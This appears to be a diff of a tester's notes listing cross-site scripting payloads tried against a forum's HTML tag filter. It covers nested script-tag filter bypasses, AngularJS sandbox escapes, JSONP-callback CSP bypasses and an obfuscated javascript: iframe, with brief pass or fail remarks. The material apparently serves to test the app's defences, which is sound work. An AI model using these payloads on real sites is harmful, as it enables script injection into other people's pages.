@@ -36,4 +36,55 @@ body</p><<script>script>alert("123")<</script>/script>
 body</p><<<script>script>alert("123")<</script>/script>
 body</p><<<scriptscript>alert("123")<</script>/script>
 
+Forum.js line 221-224 uses validation of html tags
+
 body</p><<scriptscript>alert("123")</script> Small success, but does not run javascript alert.
+
+
+</p><<scriptscript src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
+<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div> Failed
+
+</p><<scriptscript src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+
+
+</p><<scriptscript src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
+
+</p><<scriptscript src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/openerp/8.0.0/openerp.min.js?callback=alert(1)"></script>
+
+</p><<scriptscript src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"></script>
+<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} };alert(1)//');}} </div>
+
+
+</p><<scriptscript src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
+<div ng-app>
+  <div ng-constructor="x = $root.constructor.assign($root.constructor, {prototype: {charAt: [].join}}); $eval('a=1} }; alert(1)//')"></div>
+</div>
+
+
+
+
+
+</p><<scriptscript src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
+<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>
+
+</p><<scriptscript src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
+<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>
+
+
+
+</p><<scriptscript/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
+<iframe/ng-app/ng-csp/srcdoc="
+  <<scriptscript/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
+  </script>
+  <img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
+>
+
+
+</p><<scriptscript src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
+<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
+
+
+
+<iframe src="javasjavascriptcript:console.log(`You've been hacked!`)"></iframe>
+
